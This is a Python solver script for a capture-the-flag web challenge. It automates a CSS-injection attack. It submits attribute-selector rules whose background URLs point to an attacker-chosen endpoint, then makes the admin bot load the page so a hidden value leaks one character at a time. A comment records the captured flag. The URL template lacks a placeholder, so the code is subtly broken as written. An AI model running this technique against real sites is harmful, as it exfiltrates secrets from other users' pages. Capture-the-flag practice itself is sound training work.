from string import ascii_lowercase, digits

import requests

# flag = 'l0l1nj3ctc55'

class Solver:
    def __init__(self):
        self.url = 'https://moar_horse_3.tjctf.org/'
        self.flag = ''
    
    def make_css(self, flag):
        css = ''
        css_attribute = 'h1[value^={}{}]'
        css_value = 'background:url("任意の対応したエンドポイントのurlを入れる")'

        for parameter in ascii_lowercase + digits:
            css += (css_attribute.format(flag, parameter)) +  '{' + (css_value.format(parameter)) + '}'
        print(css)
        return css

    def post_data(self, data):
        ses = requests.Session()
        ses.post(
            self.url,
            {'custom_styles': data}
        )
        self.get_admin(ses)

    def get_admin(self, ses):
        ses.get(self.url + 'show_admin')
        
    def solve(self):
        while True:
            css = self.make_css(self.flag)
            self.post_data(css)
            self.flag += input()

if __name__ == '__main__':
    solver = Solver()
    solver.solve()
